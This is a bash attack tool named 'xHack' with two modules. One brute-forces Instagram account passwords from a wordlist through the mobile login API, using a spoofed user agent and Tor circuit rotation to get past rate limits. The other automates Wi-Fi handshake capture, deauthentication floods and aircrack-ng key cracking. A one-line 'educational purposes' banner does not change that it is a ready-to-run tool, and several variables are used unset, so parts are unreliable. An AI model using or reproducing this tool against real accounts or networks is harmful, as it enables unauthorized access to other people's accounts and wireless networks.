#!/bin/bash
#coded by Fadester
#v1.1

green='\033[1;32m'
red='\e[1;91m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
blink='\e[5m'
magenta='\e[35m'

user="username"
wordlist="wordlist"
user_id=$(id -u)
if [[ $user_id == "1000" ]]; then
  echo -e $red You need to be root to run this script! $farblos
  exit 1
fi
clear 
command -v openssl > /dev/null 2>&1 || { echo >&2 "You need openssl to use this script"; exit 1; }
command -v tor > /dev/null 2>&1 || { echo >&2 "You need TOR to use this script"; }
command -v aircrack-ng > /dev/null 2>&1 || { echo >&2 "You need aircrack-ng to use this script"; exit 1; }

banner() {
printf " \e[1;33m      \e[1;31m   _   _            _     \e[0m\n  "
printf " \e[1;33m __  _\e[1;31m| | | | __ _  ___| | __ \e[0m\n  "
printf " \e[1;33m \ \/ /\e[1;31m |_| |/ _  |/ __| |/ / \e[0m\n  "
printf " \e[1;33m  >  <\e[1;31m|  _  | (_| | (__|   <  \e[0m\n  "
printf " \e[1;33m /_/\_\e[1;31m\_| |_|\____|\___|_|\_\ \e[0m\n  "
echo
printf " \e[34m coded by Fadester \e[0m\n"
printf " \e[34m v1.1 \e[0m\n"
echo -e "$lightred  This tool was only written for educational purposes. Entering the privacy of others is illegal! " "$farblos"
}
show_modules() {
echo
echo -e "$green ------>$yellow      Modules                value   "
echo -e "$magenta              -------                ----- $farblos  "
echo ""
echo -e "$green ------>$BlueF     Hack insta Acc $red           1  $farblos "
echo ""
echo ""
echo -e "$green ------>$BlueF     Hack Wlan Key  $red           2  $farblos "
echo ""
echo ""
eingabe
}
hack_insta_options() {
echo ""
echo -e "$green ------>$yellow      options                value    "
echo "              -------                -----    "
echo ""
echo -e "$green ------> $BlueF     username $red              ${user:-   user}      "
echo ""
echo ""
echo -e "$green ------>   $BlueF   wordlist           $red    ${wl_pass:-wordlist} $farblos     "
echo ""
hack_acc
}
information() {
echo ""
echo -e "$green ------>$magenta coded by Fadester"
echo -e "$green ------>$magenta Follow me on"
echo -e "$green ------>$magenta github: https://github.com/Fadester"
echo -e "$green ------>$magenta instagram: Fadester_04"
echo -e "$green ------>$magenta snapchat: robinjoel04"
echo -e "$green ------>$magenta Twitter: Robin04"
echo -e "$green ------>$magenta Thank you for using xHack =) $farblos"
echo ""
}
changeip() {

  killall -HUP tor

}
hack_acc() {
read -p $'\033[1;32m┌─[\e[0m\e[1;93mhackInstaAcc\e[0m\033[1;32m]\033[1;32m─[\e[35mnoob\e[0m\033[1;32m]
\033[1;32m└──╼ \e[0;36m$ \e[1;91m' eingabe1
if [[ $eingabe1 == "show options" ]];
then
	hack_insta_options
  hack_acc
elif [[ $eingabe1 == "set username" ]];
then
  echo ""
  read -p $'\033[1;32m ------> \e[0m\e[1;93musername: \e[1;91m' user
  checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
  if [[ "$checkaccount" == 1 ]]; then
    echo ""
    echo -e "$green ------>$red user don't exist"
    echo -e "$green ------>$yellow Try again $farblos"
    echo ""
    sleep 1
    hack_acc
  else
    echo ""
    hack_acc
  fi
  elif [[ $eingabe1 == "set wordlist" ]]; then
    echo ""
    read -p $'\033[1;32m ------> \e[0m\e[1;93mwordlist: \e[1;91m' wl_pass    
    wordlist_char=$(wc -l $wl_pass) 
    echo ""
	  hack_acc
elif [[ $eingabe1 == "show requirements" ]]; then
  echo ""
  echo -e "$green Username=$user $farblos"
  echo -e "$green Wordlist=$wordlist_char $farblos"
  echo ""
  hack_acc
elif [[ $eingabe1 == "clear" ]];
then
  clear
  banner
  hack_acc
elif [[ $eingabe1 == "exit" ]];
then
	eingabe
elif [[ $eingabe1 == "start" ]];
then

service tor start > /dev/null 2>&1

counter=0
turn=10
startline=1
endline=4

chars_wl=$(wc -w $wl_pass | cut -d " " -f1)
phone="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
guid="$string8-$string4-$string4-$string4-$string12"
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
string4=$(openssl rand -hex 32 | cut -c 1-4)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
printf "\n"
while [ "$counter" -lt 10 ]; do
for pass in $( sed -n ''$startline','$endline'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'

IFS=$'\n'

hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[0m\e[1;77m[\e[0m\e[1;92m!\e[0m\e[1;77m] Try pass: \e[0m\e[1;93m %s\e[0m\n" $pass
IFS=$'\n'
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq );
 if [[ $var == "challenge" ]]; then pw_found; elif [[ $var == "logged_in_user" ]]; then pw_found; elif [[ $var == "Please wait" ]]; then echo "Please wait"; sleep 120 ;fi;

let counter++

curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq
let startline+=1
let endline+=1
if [[ $startline == $chars_wl ]]; then
  echo -e  "$red Wordlist end! $farblos"
  hack_acc
fi
killall -HUP tor
done
done

  echo ""
  echo "   COMPLETE!"
  echo ""
  read -p "Do you want to do a second attack? y/n: " second
  echo ""
  if [[ $second == "y" ]];
  then
    hack_acc
  elif [[ $second == "Y" ]];
  then
    hack_acc
  elif [[ $second == "n" ]];
  then
    eingabe
  elif [[ $second == "N" ]];
  then
    eingabe
  else
    echo ""
    echo -e "$red invalid option $farblos"
    echo ""
fi
elif [[ $eingabe1 == "help" ]];
then
echo ""
echo -e "$green ------>$magenta help = show this message"
echo -e "$green ------>$magenta show options = show requirements"
echo -e "$green ------>$magenta set username = set username"
echo -e "$green ------>$magenta set wordlist = set wordlist"
echo -e "$green ------>$magenta show requirements = show username & wordlist"
echo -e "$green ------>$magenta start = start the attack"
echo -e "$green ------>$magenta clear = clear the window"
echo -e "$green ------>$magenta exit = go to start"
echo -e "$green ------>$magenta show info = show infortmations"
echo -e "$green ------>$red =D $farblos"
echo ""
hack_acc
elif [[ $eingabe1 == "show info" ]];
then
  information
  hack_acc
elif [[ $eingabe1 == "show options" ]];
then
	information
	hack_acc
else
	echo invalid command
	hack_acc
fi


}

pw_found() {
echo ""
echo -e "$BlueF>>>$yellow Password found! $BlueF<<< $farblos"
echo -e "$green----> Username: $red$user $farblos"
echo -e "$green----> Password: $red$pass $farblos"
echo ""
hack_acc
}
hack_wlan() {

echo -e "$red __      __.__                 $green   ___ ___                __     $farblos "
echo -e "$red/  \    /  \  | _____    ____  $green  /   |   \_____    ____ |  | __ $farblos "
echo -e "$red\   \/\/   /  | \__  \  /    \ $green /    ~    \__  \ _/ ___\|  |/ / $farblos "
echo -e "$red \        /|  |__/ __ \|   |  \ $green\    Y    // __ \\  \___|    <  $farblos "
echo -e " $red \__/\  / |____(____  /___|  / $green \___|_  /(____  /\___  >__|_ \ $farblos "
echo -e " $red      \/            \/     \/      $green   \/      \/     \/     \/     $farblos "
echo ""
airmon-ng 
read -p "Interface: " interface
airmon-ng start $interface
read -p "Kill processes? (y/n): " kill_pro
if [[ $kill_pro == "y" ]]; then
	read -p "Kill 1.: " kill1
	read -p "Kill 2.: " kill2
	read -p "Kill 3.: " kill3
	read -p "Kill 4.: " kill4
	read -p "Kill 5.: " kill5
	kill $kill1
	kill $kill2
	kill $kill3
	kill $kill4
	kill $kill5
elif [[ $kill_pro == "n" ]]; then 
	echo -e "$green OK! $farblos"
fi
airmon-ng
read -p "New interface? (y/n): " new_interface
if [[ $new_interface == "y" ]]; then
	read -p "Interface: " interface
fi
airmon-ng start $interface
sleep 1
echo -e "$yellow Copy BSSID (BSSID) & Channel (CH) $farblos" 
sleep 3.5
xterm -T "  " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -e airodump-ng $interface
sleep 2
read -p "$green BSSID: $farblos " bssid  
read -p "$green Channel: $farblos " ch
read -p "$yellow Name for handshake: " handshake_name 
echo -e "$yellow Close the windows when you have the handshake $farblos " 
sleep 2
gnome-terminal -- airodump-ng --$bssid -c $ch -w $handshake_name $interface
sleep 1 
xterm -T " xHack " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -e aireplay-ng -0 50 -a $bssid $interface 
sleep 2
read -p "Do you have the handshake? (y/n): " hs
if [[ $hs == "y" ]]; then
	read -p "Handshake (.cap): " handshake
elif [[ $hs == "n" ]]; then 
xterm -T " xHack " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -e aireplay-ng -0 100 -a $bssid $interface
sleep 2
read -p "$green Handshake (.cap): $farblos" handshake 
fi
sleep 1.5
echo -e "$red Start attack... $farblos"
while true; do 
	read -p "Wordlist: " wordlist
	xterm -T " xHack " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -e aircrack-ng -w $wordlist $handshake $interface
	sleep 2
	read -p "Key found? (y/n): " key_found
	if [[ $key_found == "y" ]]; then 
		eingabe 
	elif [[ $key_found == "n" ]]; then
		read -p "New wordlist: " new_wl
		xterm -T " xHack " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -e aircrack-ng -w $new_wl $handshake $interface
		sleep 2
	fi
done



}

eingabe() {
echo ""
read -p $'\033[1;32m┌─[\e[0m\e[1;93mxHack\e[0m\033[1;32m]\033[1;32m─[\e[35mnoob\e[0m\033[1;32m]
\033[1;32m└──╼ \e[0;36m$ \e[1;91m' eingabe

if [[ $eingabe == "show modules" ]];
then
	show_modules
elif [[ $eingabe == "use 1" ]];
then
	hack_acc
elif [[ $eingabe == "use 2" ]]; 
then
	hack_wlan
elif [[ $eingabe == "help" ]];
then
echo ""
echo -e "$green ------>$magenta help = show this message"
echo -e "$green ------>$magenta use 'value' = go to 1,2,3...."
echo -e "$green ------>$magenta show modules = show all modules"
echo -e "$green ------>$magenta show info = show infortmations"
echo -e "$green ------>$magenta exit = exit"
echo -e "$green ------>$red :D $farblos"
eingabe
elif [[ $eingabe == "show info" ]];
then
  information
  eingabe
elif [[ $eingabe == "clear" ]];
then
	clear
	banner
	eingabe
elif [[ $eingabe == "exit" ]];
then
  exit
else
	echo ""
	echo -e "$red invalid command $farblos "
	eingabe
fi
}

banner
eingabe
